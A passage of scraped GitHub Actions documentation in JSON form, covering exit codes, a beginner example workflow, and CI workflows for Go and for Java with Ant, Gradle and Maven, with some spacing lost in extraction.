      },
      {
        "type": "heading",
        "level": 2,
        "text": "Working with the community"
      },
      {
        "type": "paragraph",
        "text": "GitHub provides tools and guides to help you work with the open source community. Here are a few tools we recommend setting up for healthy bidirectional communication. By providing the following signals to the community, you encourage others to use, modify, and contribute to your action:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Maintain aREADMEwith plenty of usage examples and guidance. For more information, seeAbout READMEs.",
          "Include a workflow status badge in yourREADMEfile. For more information, seeAdding a workflow status badge. Also visitshields.ioto learn about other badges that you can add.",
          "Add community health files likeCODE_OF_CONDUCT,CONTRIBUTING, andSECURITY. For more information, seeCreating a default community health file.",
          "Keep issues current by utilizing actions likeactions/stale.",
          "Use GitHub's security features to communicate about vulnerabilities and how to fix them. For more information, seeUsing GitHub's security features to secure your use of GitHub Actions."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Further reading"
      },
      {
        "type": "paragraph",
        "text": "Examples where similar patterns are employed include:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "github/super-linter",
          "octokit/request-action",
          "actions/javascript-action"
        ]
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/sharing-automations/creating-actions/setting-exit-codes-for-actions",
    "content": [
      {
        "type": "heading",
        "level": 2,
        "text": "About exit codes"
      },
      {
        "type": "paragraph",
        "text": "GitHub uses the exit code to set the action's check run status, which can besuccessorfailure."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Setting a failure exit code in a JavaScript action"
      },
      {
        "type": "paragraph",
        "text": "If you are creating a JavaScript action, you can use the actions toolkit@actions/corepackage to log a message and set a failure exit code. For example:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "try {\n  // something\n} catch (error) {\n  core.setFailed(error.message);\n}"
      },
      {
        "type": "paragraph",
        "text": "For more information, seeCreating a JavaScript action."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Setting a failure exit code in a Docker container action"
      },
      {
        "type": "paragraph",
        "text": "If you are creating a Docker container action, you can set a failure exit code in yourentrypoint.shscript. For example:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "if <condition> ; then\n  echo \"Game over!\"\n  exit 1\nfi"
      },
      {
        "type": "paragraph",
        "text": "For more information, seeCreating a Docker container action."
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/use-cases-and-examples/creating-an-example-workflow",
    "content": [
      {
        "type": "heading",
        "level": 2,
        "text": "Introduction"
      },
      {
        "type": "paragraph",
        "text": "This guide shows you how to create a basic workflow that is triggered when code is pushed to your repository."
      },
      {
        "type": "paragraph",
        "text": "To get started with preconfigured workflows, browse through the list of templates in theactions/starter-workflowsrepository. For more information, seeUsing workflow templates."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Creating an example workflow"
      },
      {
        "type": "paragraph",
        "text": "GitHub Actions uses YAML syntax to define the workflow. Each workflow is stored as a separate YAML file in your code repository, in a directory named.github/workflows."
      },
      {
        "type": "paragraph",
        "text": "You can create an example workflow in your repository that automatically triggers a series of commands whenever code is pushed. In this workflow, GitHub Actions checks out the pushed code, installs thebatstesting framework, and runs a basic command to output the bats version:bats -v."
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "In your repository, create the.github/workflows/directory to store your workflow files.",
          "In the.github/workflows/directory, create a new file calledlearn-github-actions.ymland add the following code.YAMLname: learn-github-actions\nrun-name: ${{ github.actor }} is learning GitHub Actions\non: [push]\njobs:\n  check-bats-version:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - uses: actions/setup-node@v4\n        with:\n          node-version: '20'\n      - run: npm install -g bats\n      - run: bats -vname:learn-github-actionsrun-name:${{github.actor}}islearningGitHubActionson:[push]jobs:check-bats-version:runs-on:ubuntu-lateststeps:-uses:actions/checkout@v4-uses:actions/setup-node@v4with:node-version:'20'-run:npminstall-gbats-run:bats-v",
          "Commit these changes and push them to your GitHub repository."
        ]
      },
      {
        "type": "paragraph",
        "text": "Your new GitHub Actions workflow file is now installed in your repository and will run automatically each time someone pushes a change to the repository. To see the details about a workflow's execution history, seeViewing the activity for a workflow run."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Understanding the workflow file"
      },
      {
        "type": "paragraph",
        "text": "To help you understand how YAML syntax is used to create a workflow file, this section explains each line of the introduction's example:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "name: learn-github-actions"
      },
      {
        "type": "paragraph",
        "text": "Optional - The name of the workflow as it will appear in the \"Actions\" tab of the GitHub repository. If this field is omitted, the name of the workflow file will be used instead."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "run-name: ${{ github.actor }} is learning GitHub Actions"
      },
      {
        "type": "paragraph",
        "text": "Optional - The name for workflow runs generated from the workflow, which will appear in the list of workflow runs on your repository's \"Actions\" tab. This example uses an expression with thegithubcontext to display the username of the actor that triggered the workflow run. For more information, seeAUTOTITLE."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on: [push]"
      },
      {
        "type": "paragraph",
        "text": "Specifies the trigger for this workflow. This example uses thepushevent, so a workflow run is triggered every time someone pushes a change to the repository or merges a pull request. This is triggered by a push to every branch; for examples of syntax that runs only on pushes to specific branches, paths, or tags, seeAUTOTITLE."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "jobs:"
      },
      {
        "type": "paragraph",
        "text": "Groups together all the jobs that run in thelearn-github-actionsworkflow."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "check-bats-version:"
      },
      {
        "type": "paragraph",
        "text": "Defines a job namedcheck-bats-version. The child keys will define properties of the job."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "runs-on: ubuntu-latest"
      },
      {
        "type": "paragraph",
        "text": "Configures the job to run on the latest version of an Ubuntu Linux runner. This means that the job will execute on a fresh virtual machine hosted by GitHub. For syntax examples using other runners, seeAUTOTITLE"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "steps:"
      },
      {
        "type": "paragraph",
        "text": "Groups together all the steps that run in thecheck-bats-versionjob. Each item nested under this section is a separate action or shell script."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "- uses: actions/checkout@v4"
      },
      {
        "type": "paragraph",
        "text": "Theuseskeyword specifies that this step will runv4of theactions/checkoutaction. This is an action that checks out your repository onto the runner, allowing you to run scripts or other actions against your code (such as build and test tools). You should use the checkout action any time your workflow will use the repository's code."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "- uses: actions/setup-node@v4\n        with:\n          node-version: '20'"
      },
      {
        "type": "paragraph",
        "text": "This step uses theactions/setup-node@v4action to install the specified version of the Node.js. (This example uses version 20.) This puts both thenodeandnpmcommands in yourPATH."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "- run: npm install -g bats"
      },
      {
        "type": "paragraph",
        "text": "Therunkeyword tells the job to execute a command on the runner. In this case, you are usingnpmto install thebatssoftware testing package."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "- run: bats -v"
      },
      {
        "type": "paragraph",
        "text": "Finally, you'll run thebatscommand with a parameter that outputs the software version."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "# Optional - The name of the workflow as it will appear in the \"Actions\" tab of the GitHub repository. If this field is omitted, the name of the workflow file will be used instead.\nname: learn-github-actions\n\n# Optional - The name for workflow runs generated from the workflow, which will appear in the list of workflow runs on your repository's \"Actions\" tab. This example uses an expression with the `github` context to display the username of the actor that triggered the workflow run. For more information, see [AUTOTITLE](/actions/using-workflows/workflow-syntax-for-github-actions#run-name).\nrun-name: ${{ github.actor }} is learning GitHub Actions\n\n# Specifies the trigger for this workflow. This example uses the `push` event, so a workflow run is triggered every time someone pushes a change to the repository or merges a pull request. This is triggered by a push to every branch; for examples of syntax that runs only on pushes to specific branches, paths, or tags, see [AUTOTITLE](/actions/reference/workflow-syntax-for-github-actions#onpushpull_requestpull_request_targetpathspaths-ignore).\non: [push]\n\n# Groups together all the jobs that run in the `learn-github-actions` workflow.\njobs:\n\n# Defines a job named `check-bats-version`. The child keys will define properties of the job.\n  check-bats-version:\n\n# Configures the job to run on the latest version of an Ubuntu Linux runner. This means that the job will execute on a fresh virtual machine hosted by GitHub. For syntax examples using other runners, see [AUTOTITLE](/actions/reference/workflow-syntax-for-github-actions#jobsjob_idruns-on)\n    runs-on: ubuntu-latest\n\n# Groups together all the steps that run in the `check-bats-version` job. Each item nested under this section is a separate action or shell script.\n    steps:\n\n# The `uses` keyword specifies that this step will run `v4` of the `actions/checkout` action. This is an action that checks out your repository onto the runner, allowing you to run scripts or other actions against your code (such as build and test tools). You should use the checkout action any time your workflow will use the repository's code.\n      - uses: actions/checkout@v4\n\n# This step uses the `actions/setup-node@v4` action to install the specified version of the Node.js. (This example uses version 20.) This puts both the `node` and `npm` commands in your `PATH`.\n      - uses: actions/setup-node@v4\n        with:\n          node-version: '20'\n\n# The `run` keyword tells the job to execute a command on the runner. In this case, you are using `npm` to install the `bats` software testing package.\n      - run: npm install -g bats\n\n# Finally, you'll run the `bats` command with a parameter that outputs the software version.\n      - run: bats -v"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Visualizing the workflow file"
      },
      {
        "type": "paragraph",
        "text": "In this diagram, you can see the workflow file you just created and how the GitHub Actions components are organized in a hierarchy. Each step executes a single action or shell script. Steps 1 and 2 run actions, while steps 3 and 4 run shell scripts. To find more prebuilt actions for your workflows, seeUsing pre-written building blocks in your workflow."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Viewing the activity for a workflow run"
      },
      {
        "type": "paragraph",
        "text": "When your workflow is triggered, aworkflow runis created that executes the workflow. After a workflow run has started, you can see a visualization graph of the run's progress and view each step's activity on GitHub."
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "On GitHub, navigate to the main page of the repository.",
          "Under your repository name, clickActions.",
          "In the left sidebar, click the workflow you want to see.",
          "From the list of workflow runs, click the name of the run to see the workflow run summary.",
          "In the left sidebar or in the visualization graph, click the job you want to see.",
          "To view the results of a step, click the step."
        ]
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/use-cases-and-examples/building-and-testing/building-and-testing-go",
    "content": [
      {
        "type": "heading",
        "level": 2,
        "text": "Introduction"
      },
      {
        "type": "paragraph",
        "text": "This guide shows you how to build, test, and publish a Go package."
      },
      {
        "type": "paragraph",
        "text": "GitHub-hosted runners have a tools cache with preinstalled software, which includes the dependencies for Go. For a full list of up-to-date software and the preinstalled versions of Go, seeUsing GitHub-hosted runners."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Prerequisites"
      },
      {
        "type": "paragraph",
        "text": "You should already be familiar with YAML syntax and how it's used with GitHub Actions. For more information, seeWorkflow syntax for GitHub Actions."
      },
      {
        "type": "paragraph",
        "text": "We recommend that you have a basic understanding of the Go language. For more information, seeGetting started with Go."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Using a Go workflow template"
      },
      {
        "type": "paragraph",
        "text": "To get started quickly, add a workflow template to the.github/workflowsdirectory of your repository."
      },
      {
        "type": "paragraph",
        "text": "GitHub provides a Go workflow template that should work for most Go projects. The subsequent sections of this guide give examples of how you can customize this workflow template."
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "On GitHub, navigate to the main page of the repository.",
          "Under your repository name, clickActions.",
          "If you already have a workflow in your repository, clickNew workflow.",
          "The \"Choose a workflow\" page shows a selection of recommended workflow templates. Search for \"go\".",
          "Filter the selection of workflows by clickingContinuous integration.",
          "On the \"Go - by GitHub Actions\" workflow, clickConfigure.",
          "Edit the workflow as required. For example, change the version of Go.",
          "ClickCommit changes.Thego.ymlworkflow file is added to the.github/workflowsdirectory of your repository."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Specifying a Go version"
      },
      {
        "type": "paragraph",
        "text": "The easiest way to specify a Go version is by using thesetup-goaction provided by GitHub. For more information see, thesetup-goaction."
      },
      {
        "type": "paragraph",
        "text": "To use a preinstalled version of Go on a GitHub-hosted runner, pass the relevant version to thego-versionproperty of thesetup-goaction. This action finds a specific version of Go from the tools cache on each runner, and adds the necessary binaries toPATH. These changes will persist for the remainder of the job."
      },
      {
        "type": "paragraph",
        "text": "Thesetup-goaction is the recommended way of using Go with GitHub Actions, because it helps ensure consistent behavior across different runners and different versions of Go. If you are using a self-hosted runner, you must install Go and add it toPATH."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Using multiple versions of Go"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "name: Go\n\non: [push]\n\njobs:\n  build:\n\n    runs-on: ubuntu-latest\n    strategy:\n      matrix:\n        go-version: [ '1.19', '1.20', '1.21.x' ]\n\n    steps:\n      - uses: actions/checkout@v4\n      - name: Setup Go ${{ matrix.go-version }}\n        uses: actions/setup-go@v5\n        with:\n          go-version: ${{ matrix.go-version }}\n      # You can test your matrix by printing the current Go version\n      - name: Display Go version\n        run: go version"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Using a specific Go version"
      },
      {
        "type": "paragraph",
        "text": "You can configure your job to use a specific version of Go, such as1.20.8. Alternatively, you can use semantic version syntax to get the latest minor release. This example uses the latest patch release of Go 1.21:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "- name: Setup Go 1.21.x\n        uses: actions/setup-go@v5\n        with:\n          # Semantic version range syntax or exact version of Go\n          go-version: '1.21.x'"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Installing dependencies"
      },
      {
        "type": "paragraph",
        "text": "You can usego getto install dependencies:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "steps:\n      - uses: actions/checkout@v4\n      - name: Setup Go\n        uses: actions/setup-go@v5\n        with:\n          go-version: '1.21.x'\n      - name: Install dependencies\n        run: |\n          go get .\n          go get example.com/octo-examplemodule\n          go get example.com/octo-examplemodule@v1.3.4"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Caching dependencies"
      },
      {
        "type": "paragraph",
        "text": "You can cache and restore dependencies using thesetup-goaction. By default, caching is enabled when using thesetup-goaction."
      },
      {
        "type": "paragraph",
        "text": "Thesetup-goaction searches for the dependency file,go.sum, in the repository root and uses the hash of the dependency file as a part of the cache key."
      },
      {
        "type": "paragraph",
        "text": "You can use thecache-dependency-pathparameter for cases when multiple dependency files are used, or when they are located in different subdirectories."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "- name: Setup Go\n        uses: actions/setup-go@v5\n        with:\n          go-version: '1.17'\n          cache-dependency-path: subdir/go.sum"
      },
      {
        "type": "paragraph",
        "text": "If you have a custom requirement or need finer controls for caching, you can use thecacheaction. For more information, seeCaching dependencies to speed up workflows."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Building and testing your code"
      },
      {
        "type": "paragraph",
        "text": "You can use the same commands that you use locally to build and test your code. This example workflow demonstrates how to usego buildandgo testin a job:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "name: Go\non: [push]\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n\n    steps:\n      - uses: actions/checkout@v4\n      - name: Setup Go\n        uses: actions/setup-go@v5\n        with:\n          go-version: '1.21.x'\n      - name: Install dependencies\n        run: go get .\n      - name: Build\n        run: go build -v ./...\n      - name: Test with the Go CLI\n        run: go test"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Packaging workflow data as artifacts"
      },
      {
        "type": "paragraph",
        "text": "After a workflow completes, you can upload the resulting artifacts for analysis. For example, you may need to save log files, core dumps, test results, or screenshots. The following example demonstrates how you can use theupload-artifactaction to upload test results."
      },
      {
        "type": "paragraph",
        "text": "For more information, seeStoring and sharing data from a workflow."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "name: Upload Go test results\n\non: [push]\n\njobs:\n  build:\n\n    runs-on: ubuntu-latest\n    strategy:\n      matrix:\n        go-version: [ '1.19', '1.20', '1.21.x' ]\n\n    steps:\n      - uses: actions/checkout@v4\n      - name: Setup Go\n        uses: actions/setup-go@v5\n        with:\n          go-version: ${{ matrix.go-version }}\n      - name: Install dependencies\n        run: go get .\n      - name: Test with Go\n        run: go test -json > TestResults-${{ matrix.go-version }}.json\n      - name: Upload Go test results\n        uses: actions/upload-artifact@v4\n        with:\n          name: Go-results-${{ matrix.go-version }}\n          path: TestResults-${{ matrix.go-version }}.json"
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/use-cases-and-examples/building-and-testing/building-and-testing-java-with-ant",
    "content": [
      {
        "type": "heading",
        "level": 2,
        "text": "Introduction"
      },
      {
        "type": "paragraph",
        "text": "This guide shows you how to create a workflow that performs continuous integration (CI) for your Java project using the Ant build system. The workflow you create will allow you to see when commits to a pull request cause build or test failures against your default branch; this approach can help ensure that your code is always healthy. You can extend your CI workflow to upload artifacts from a workflow run."
      },
      {
        "type": "paragraph",
        "text": "GitHub-hosted runners have a tools cache with pre-installed software, which includes Java Development Kits (JDKs) and Ant. For a list of software and the pre-installed versions for JDK and Ant, seeUsing GitHub-hosted runners."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Prerequisites"
      },
      {
        "type": "paragraph",
        "text": "You should be familiar with YAML and the syntax for GitHub Actions. For more information, see:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Workflow syntax for GitHub Actions",
          "Writing workflows"
        ]
      },
      {
        "type": "paragraph",
        "text": "We recommend that you have a basic understanding of Java and the Ant framework. For more information, see theApache Ant Manual."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Using an Ant workflow template"
      },
      {
        "type": "paragraph",
        "text": "To get started quickly, add a workflow template to the.github/workflowsdirectory of your repository."
      },
      {
        "type": "paragraph",
        "text": "GitHub provides a workflow template for Ant that should work for most Java with Ant projects. The subsequent sections of this guide give examples of how you can customize this workflow template."
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "On GitHub, navigate to the main page of the repository.",
          "Under your repository name, clickActions.",
          "If you already have a workflow in your repository, clickNew workflow.",
          "The \"Choose a workflow\" page shows a selection of recommended workflow templates. Search for \"Java with Ant\".",
          "On the \"Java with Ant\" workflow, clickConfigure.",
          "Edit the workflow as required. For example, change the Java version.",
          "ClickCommit changes.Theant.ymlworkflow file is added to the.github/workflowsdirectory of your repository."
        ]
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Specifying the Java version and architecture"
      },
      {
        "type": "paragraph",
        "text": "The workflow template sets up thePATHto contain OpenJDK 8 for the x64 platform. If you want to use a different version of Java, or target a different architecture (x64orx86), you can use thesetup-javaaction to choose a different Java runtime environment."
      },
      {
        "type": "paragraph",
        "text": "For example, to use version 11 of the JDK provided by Adoptium for the x64 platform, you can use thesetup-javaaction and configure thejava-version,distributionandarchitectureparameters to'11','temurin'andx64."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "steps:\n  - uses: actions/checkout@v4\n  - name: Set up JDK 11 for x64\n    uses: actions/setup-java@v4\n    with:\n      java-version: '11'\n      distribution: 'temurin'\n      architecture: x64"
      },
      {
        "type": "paragraph",
        "text": "For more information, see thesetup-javaaction."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Building and testing your code"
      },
      {
        "type": "paragraph",
        "text": "You can use the same commands that you use locally to build and test your code."
      },
      {
        "type": "paragraph",
        "text": "The workflow template will run the default target specified in yourbuild.xmlfile. Your default target will commonly be set to build classes, run tests and package classes into their distributable format, for example, a JAR file."
      },
      {
        "type": "paragraph",
        "text": "If you use different commands to build your project, or you want to run a different target, you can specify those. For example, you may want to run thejartarget that's configured in yourbuild-ci.xmlfile."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "steps:\n  - uses: actions/checkout@v4\n  - uses: actions/setup-java@v4\n    with:\n      java-version: '17'\n      distribution: 'temurin'\n  - name: Run the Ant jar target\n    run: ant -noinput -buildfile build-ci.xml jar"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Packaging workflow data as artifacts"
      },
      {
        "type": "paragraph",
        "text": "After your build has succeeded and your tests have passed, you may want to upload the resulting Java packages as a build artifact. This will store the built packages as part of the workflow run, and allow you to download them. Artifacts can help you test and debug pull requests in your local environment before they're merged. For more information, seeStoring and sharing data from a workflow."
      },
      {
        "type": "paragraph",
        "text": "Ant will usually create output files like JARs, EARs, or WARs in thebuild/jardirectory. You can upload the contents of that directory using theupload-artifactaction."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "steps:\n  - uses: actions/checkout@v4\n  - uses: actions/setup-java@v4\n    with:\n      java-version: '17'\n      distribution: 'temurin'\n\n  - run: ant -noinput -buildfile build.xml\n  - uses: actions/upload-artifact@v4\n    with:\n      name: Package\n      path: build/jar"
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/use-cases-and-examples/building-and-testing/building-and-testing-java-with-gradle",
    "content": [
      {
        "type": "heading",
        "level": 2,
        "text": "Introduction"
      },
      {
        "type": "paragraph",
        "text": "This guide shows you how to create a workflow that performs continuous integration (CI) for your Java project using the Gradle build system. The workflow you create will allow you to see when commits to a pull request cause build or test failures against your default branch; this approach can help ensure that your code is always healthy. You can extend your CI workflow to cache files and upload artifacts from a workflow run."
      },
      {
        "type": "paragraph",
        "text": "GitHub-hosted runners have a tools cache with pre-installed software, which includes Java Development Kits (JDKs) and Gradle. For a list of software and the pre-installed versions for JDK and Gradle, seeUsing GitHub-hosted runners."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Prerequisites"
      },
      {
        "type": "paragraph",
        "text": "You should be familiar with YAML and the syntax for GitHub Actions. For more information, see:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Workflow syntax for GitHub Actions",
          "Writing workflows"
        ]
      },
      {
        "type": "paragraph",
        "text": "We recommend that you have a basic understanding of Java and the Gradle framework. For more information, see theGradle User Manual."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Using a Gradle workflow template"
      },
      {
        "type": "paragraph",
        "text": "To get started quickly, add a workflow template to the.github/workflowsdirectory of your repository."
      },
      {
        "type": "paragraph",
        "text": "GitHub provides a workflow template for Gradle that should work for most Java with Gradle projects. The subsequent sections of this guide give examples of how you can customize this workflow template."
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "On GitHub, navigate to the main page of the repository.",
          "Under your repository name, clickActions.",
          "If you already have a workflow in your repository, clickNew workflow.",
          "The \"Choose a workflow\" page shows a selection of recommended workflow templates. Search for \"Java with Gradle\".",
          "On the \"Java with Gradle\" workflow, clickConfigure.\nThis workflow performs the following steps:",
          "Checks out a copy of project's repository.",
          "Sets up the Java JDK.",
          "Sets up the Gradle environment. Thegradle/actions/setup-gradleaction takes care of caching state between workflow runs, and provides a detailed summary of all Gradle executions.",
          "The \"Build with Gradle\" step executes thebuildtask using theGradle Wrapper.",
          "Edit the workflow as required. For example, change the Java version.NoteThis workflow template contains an action that is not certified by GitHub. Actions provided by third parties are governed by separate terms of service, privacy policy, and support documentation.If you use actions from third parties you should use a version specified by a commit SHA. If the action is revised and you want to use the newer version, you will need to update the SHA. You can specify a version by referencing a tag or a branch, however the action may change without warning. For more information, seeSecurity hardening for GitHub Actions.",
          "This workflow template contains an action that is not certified by GitHub. Actions provided by third parties are governed by separate terms of service, privacy policy, and support documentation.",
          "If you use actions from third parties you should use a version specified by a commit SHA. If the action is revised and you want to use the newer version, you will need to update the SHA. You can specify a version by referencing a tag or a branch, however the action may change without warning. For more information, seeSecurity hardening for GitHub Actions.",
          "ClickCommit changes.Thegradle.ymlworkflow file is added to the.github/workflowsdirectory of your repository."
        ]
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Specifying the Java version and architecture"
      },
      {
        "type": "paragraph",
        "text": "The workflow template sets up thePATHto contain OpenJDK 8 for the x64 platform. If you want to use a different version of Java, or target a different architecture (x64orx86), you can use thesetup-javaaction to choose a different Java runtime environment."
      },
      {
        "type": "paragraph",
        "text": "For example, to use version 11 of the JDK provided by Adoptium for the x64 platform, you can use thesetup-javaaction and configure thejava-version,distributionandarchitectureparameters to'11','temurin'andx64."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "steps:\n  - uses: actions/checkout@v4\n  - name: Set up JDK 11 for x64\n    uses: actions/setup-java@v4\n    with:\n      java-version: '11'\n      distribution: 'temurin'\n      architecture: x64"
      },
      {
        "type": "paragraph",
        "text": "For more information, see thesetup-javaaction."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Building and testing your code"
      },
      {
        "type": "paragraph",
        "text": "You can use the same commands that you use locally to build and test your code."
      },
      {
        "type": "paragraph",
        "text": "The workflow template will run thebuildtask by default. In the default Gradle configuration, this command will download dependencies, build classes, run tests, and package classes into their distributable format, for example, a JAR file."
      },
      {
        "type": "paragraph",
        "text": "If you use different commands to build your project, or you want to use a different task, you can specify those. For example, you may want to run thepackagetask that's configured in yourci.gradlefile."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "steps:\n  - uses: actions/checkout@v4\n  - uses: actions/setup-java@v4\n    with:\n      java-version: '17'\n      distribution: 'temurin'\n\n  - name: Setup Gradle\n    uses: gradle/actions/setup-gradle@af1da67850ed9a4cedd57bfd976089dd991e2582 # v4.0.0\n\n  - name: Build with Gradle\n    run: ./gradlew -b ci.gradle package"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Caching dependencies"
      },
      {
        "type": "paragraph",
        "text": "Your build dependencies can be cached to speed up your workflow runs. After a successful run,gradle/actions/setup-gradlecaches important parts of the Gradle user home directory. In future jobs, the cache will be restored so that build scripts won't need to be recompiled and dependencies won't need to be downloaded from remote package repositories."
      },
      {
        "type": "paragraph",
        "text": "Caching is enabled by default when using thegradle/actions/setup-gradleaction. For more information, seegradle/actions/setup-gradle."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Packaging workflow data as artifacts"
      },
      {
        "type": "paragraph",
        "text": "After your build has succeeded and your tests have passed, you may want to upload the resulting Java packages as a build artifact. This will store the built packages as part of the workflow run, and allow you to download them. Artifacts can help you test and debug pull requests in your local environment before they're merged. For more information, seeStoring and sharing data from a workflow."
      },
      {
        "type": "paragraph",
        "text": "Gradle will usually create output files like JARs, EARs, or WARs in thebuild/libsdirectory. You can upload the contents of that directory using theupload-artifactaction."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "steps:\n  - uses: actions/checkout@v4\n  - uses: actions/setup-java@v4\n    with:\n      java-version: '17'\n      distribution: 'temurin'\n\n  - name: Setup Gradle\n    uses: gradle/actions/setup-gradle@af1da67850ed9a4cedd57bfd976089dd991e2582 # v4.0.0\n\n  - name: Build with Gradle\n    run: ./gradlew build\n\n  - name: Upload build artifacts\n    uses: actions/upload-artifact@v4\n    with:\n      name: Package\n      path: build/libs"
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/use-cases-and-examples/building-and-testing/building-and-testing-java-with-maven",
    "content": [
      {
        "type": "heading",
        "level": 2,
        "text": "Introduction"
      },
      {
        "type": "paragraph",
        "text": "This guide shows you how to create a workflow that performs continuous integration (CI) for your Java project using the Maven software project management tool. The workflow you create will allow you to see when commits to a pull request cause build or test failures against your default branch; this approach can help ensure that your code is always healthy. You can extend your CI workflow to cache files and upload artifacts from a workflow run."
      },
      {
        "type": "paragraph",
        "text": "GitHub-hosted runners have a tools cache with pre-installed software, which includes Java Development Kits (JDKs) and Maven. For a list of software and the pre-installed versions for JDK and Maven, seeUsing GitHub-hosted runners."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Prerequisites"
      },
      {
        "type": "paragraph",
        "text": "You should be familiar with YAML and the syntax for GitHub Actions. For more information, see:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Workflow syntax for GitHub Actions",
          "Writing workflows"
        ]
      },
      {
        "type": "paragraph",
        "text": "We recommend that you have a basic understanding of Java and the Maven framework. For more information, see theMaven Getting Started Guidein the Maven documentation."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Using a Maven workflow template"
      },
      {
        "type": "paragraph",
        "text": "To get started quickly, add a workflow template to the.github/workflowsdirectory of your repository."
      },
      {
        "type": "paragraph",
        "text": "GitHub provides a workflow template for Maven that should work for most Java with Maven projects. The subsequent sections of this guide give examples of how you can customize this workflow template."
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "On GitHub, navigate to the main page of the repository.",
          "Under your repository name, clickActions.",
          "If you already have a workflow in your repository, clickNew workflow.",
          "The \"Choose a workflow\" page shows a selection of recommended workflow templates. Search for \"Java with Maven\".",
          "On the \"Java with Maven\" workflow, clickConfigure.",
          "Edit the workflow as required. For example, change the Java version.",
          "ClickCommit changes.Themaven.ymlworkflow file is added to the.github/workflowsdirectory of your repository."
        ]
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Specifying the Java version and architecture"
      },
      {
        "type": "paragraph",
        "text": "The workflow template sets up thePATHto contain OpenJDK 8 for the x64 platform. If you want to use a different version of Java, or target a different architecture (x64orx86), you can use thesetup-javaaction to choose a different Java runtime environment."
      },
      {
        "type": "paragraph",
        "text": "For example, to use version 11 of the JDK provided by Adoptium for the x64 platform, you can use thesetup-javaaction and configure thejava-version,distributionandarchitectureparameters to'11','temurin'andx64."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "steps:\n  - uses: actions/checkout@v4\n  - name: Set up JDK 11 for x64\n    uses: actions/setup-java@v4\n    with:\n      java-version: '11'\n      distribution: 'temurin'\n      architecture: x64"
      },
      {
        "type": "paragraph",
        "text": "For more information, see thesetup-javaaction."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Building and testing your code"
      },
      {
        "type": "paragraph",
        "text": "You can use the same commands that you use locally to build and test your code."
      },
      {
        "type": "paragraph",
        "text": "The workflow template will run thepackagetarget by default. In the default Maven configuration, this command will download dependencies, build classes, run tests, and package classes into their distributable format, for example, a JAR file."
      },
      {
        "type": "paragraph",
        "text": "If you use different commands to build your project, or you want to use a different target, you can specify those. For example, you may want to run theverifytarget that's configured in apom-ci.xmlfile."
      },
      {
        "type": "code",
